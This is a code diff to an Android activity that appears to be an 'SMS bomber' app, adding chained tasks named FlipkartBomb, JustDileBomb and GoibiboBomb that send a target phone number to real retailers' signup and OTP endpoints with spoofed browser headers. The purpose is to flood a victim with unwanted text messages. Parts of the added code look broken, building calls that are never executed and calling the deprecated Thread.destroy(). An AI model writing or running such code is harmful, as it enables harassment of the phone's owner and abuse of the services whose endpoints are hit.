@@ -34,6 +34,11 @@ import com.google.android.gms.ads.AdView;
 import com.google.android.gms.ads.InterstitialAd;
 import com.google.android.gms.ads.MobileAds;
 
+import okhttp3.MediaType;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.RequestBody;
+
 
 @SuppressWarnings("ALL")
 public class HomeActivity extends AppCompatActivity {
@@ -47,6 +52,8 @@ public class HomeActivity extends AppCompatActivity {
     AdRequest adRequest;
 
     private InterstitialAd interstitialAd;
+
+    Thread mThread;
 
     int a;
 
@@ -197,7 +204,7 @@ public class HomeActivity extends AppCompatActivity {
         @Override
         protected Void doInBackground(Void... voids) {
 
-            new Thread(new Runnable() {
+            mThread = new Thread(new Runnable() {
                 @Override
                 public void run() {
 
@@ -232,13 +239,17 @@ public class HomeActivity extends AppCompatActivity {
                     }
 
                 }
-            }).start();
+            });
+
+            mThread.start();
+
             return null;
         }
 
         @Override
         protected void onPostExecute(Void aVoid) {
             super.onPostExecute(aVoid);
+            mThread.destroy();
             new HikeBomb().execute();
         }
     }
@@ -254,7 +265,7 @@ public class HomeActivity extends AppCompatActivity {
         @Override
         protected Void doInBackground(Void... voids) {
 
-            new Thread(new Runnable() {
+            mThread = new Thread(new Runnable() {
                 @Override
                 public void run() {
 
@@ -281,7 +292,8 @@ public class HomeActivity extends AppCompatActivity {
                     }
 
                 }
-            }).start();
+            });
+            mThread.start();
 
             return null;
         }
@@ -289,6 +301,7 @@ public class HomeActivity extends AppCompatActivity {
         @Override
         protected void onPostExecute(Void aVoid) {
             super.onPostExecute(aVoid);
+            mThread.destroy();
             new MobikwickBomb().execute();
 
         }
@@ -304,7 +317,7 @@ public class HomeActivity extends AppCompatActivity {
         @Override
         protected Void doInBackground(Void... voids) {
 
-            new Thread(new Runnable() {
+            mThread = new Thread(new Runnable() {
                 @Override
                 public void run() {
 
@@ -337,25 +350,18 @@ public class HomeActivity extends AppCompatActivity {
                     }
 
                 }
-            }).start();
-
-
+            });
+            mThread.start();
             return null;
         }
 
         @Override
         protected void onPostExecute(Void aVoid) {
             super.onPostExecute(aVoid);
+            mThread.destroy();
             new ConfirmTktBomb().execute();
 
         }
-    }
-
-    private boolean isNetworkAvailable() {
-        ConnectivityManager connectivityManager
-                = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
-        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
-        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
     }
 
     @SuppressLint("StaticFieldLeak")
@@ -369,7 +375,7 @@ public class HomeActivity extends AppCompatActivity {
         @Override
         protected Void doInBackground(Void... voids) {
 
-            new Thread(new Runnable() {
+            mThread = new Thread(new Runnable() {
                 @Override
                 public void run() {
 
@@ -386,8 +392,132 @@ public class HomeActivity extends AppCompatActivity {
                     });
 
                 }
-            }).start();
+            });
+            mThread.start();
 
+            return null;
+        }
+
+        @Override
+        protected void onPostExecute(Void aVoid) {
+            super.onPostExecute(aVoid);
+            new FlipkartBomb().execute();
+
+        }
+    }
+
+    @SuppressLint("StaticFieldLeak")
+    private class FlipkartBomb extends AsyncTask<Void, Void, Void> {
+
+        @Override
+        protected void onPreExecute() {
+            super.onPreExecute();
+        }
+
+        @Override
+        protected Void doInBackground(Void... voids) {
+
+            mThread = new Thread(new Runnable() {
+                @Override
+                public void run() {
+
+                    MediaType localMediaType = MediaType.parse("application/json; charset=utf-8");
+                    OkHttpClient localOkHttpClient = new OkHttpClient();
+                    RequestBody localRequestBody = RequestBody.create(localMediaType, "{\"loginId\":[\"+91" + mPhoneNumber + "\"],\"supportAllStates\":true}");
+                    localOkHttpClient.newCall(new Request.Builder().url("https://www.flipkart.com/api/6/user/signup/status")
+                            .post(localRequestBody).addHeader("host", "www.flipkart.com")
+                            .addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0")
+                            .addHeader("accept", "*/*")
+                            .addHeader("accept-language", "en-US,en;q=0.5")
+                            .addHeader("accept-encoding", "gzip, deflate, br")
+                            .addHeader("referer", "https://www.flipkart.com/")
+                            .addHeader("x-user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop")
+                            .addHeader("content-type", "application/json")
+                            .addHeader("origin", "https://www.flipkart.com")
+                            .addHeader("content-length", "53").addHeader("connection", "keep-alive").build());
+
+                }
+            });
+            mThread.start();
+
+            return null;
+        }
+
+        @Override
+        protected void onPostExecute(Void aVoid) {
+            super.onPostExecute(aVoid);
+            new JustDileBomb().execute();
+
+        }
+    }
+
+    @SuppressLint("StaticFieldLeak")
+    private class JustDileBomb extends AsyncTask<Void, Void, Void> {
+
+        @Override
+        protected void onPreExecute() {
+            super.onPreExecute();
+        }
+
+        @Override
+        protected Void doInBackground(Void... voids) {
+
+            mThread = new Thread(new Runnable() {
+                @Override
+                public void run() {
+
+                    String str = "https://www.justdial.com/functions/ajxandroid.php?phn=" + mPhoneNumber + "&em=e.g.+abc%40xyz.com&vcode=-&type=1&applink=aib&apppage=jdmpage&pageName=jd_on_mobile";
+                    new OkHttpClient().newCall(new Request.Builder().url(str)
+                            .addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36")
+                            .build());
+
+                }
+            });
+            mThread.start();
+            return null;
+        }
+
+        @Override
+        protected void onPostExecute(Void aVoid) {
+            super.onPostExecute(aVoid);
+            new GoibiboBomb().execute();
+
+        }
+    }
+
+    @SuppressLint("StaticFieldLeak")
+    private class GoibiboBomb extends AsyncTask<Void, Void, Void> {
+
+        @Override
+        protected void onPreExecute() {
+            super.onPreExecute();
+        }
+
+        @Override
+        protected Void doInBackground(Void... voids) {
+
+            mThread = new Thread(new Runnable() {
+                @Override
+                public void run() {
+
+                    OkHttpClient localOkHttpClient = new OkHttpClient();
+                    RequestBody localRequestBody = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "mbl=" + mPhoneNumber);
+                    localOkHttpClient.newCall(new Request.Builder().url("https://www.goibibo.com/common/downloadsms/")
+                            .post(localRequestBody).addHeader("host", "www.goibibo.com")
+                            .addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0")
+                            .addHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+                            .addHeader("accept-language", "en-US,en;q=0.5")
+                            .addHeader("accept-encoding", "gzip, deflate, br")
+                            .addHeader("referer", "https://www.goibibo.com/mobile/?sms=success")
+                            .addHeader("content-type", "application/x-www-form-urlencoded")
+                            .addHeader("content-length", "14")
+                            .addHeader("connection", "keep-alive")
+                            .addHeader("upgrade-insecure-requests", "1").build());
+
+
+                }
+            });
+            mThread.start();
             return null;
         }
 
@@ -398,6 +528,8 @@ public class HomeActivity extends AppCompatActivity {
 
         }
     }
+
+
 
     @Override
     public boolean onCreateOptionsMenu(Menu menu) {
@@ -458,6 +590,13 @@ public class HomeActivity extends AppCompatActivity {
 
         }
 
+    }
+
+    private boolean isNetworkAvailable() {
+        ConnectivityManager connectivityManager
+                = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
+        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
+        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
     }
 
     private void addLog(String color, String log) {
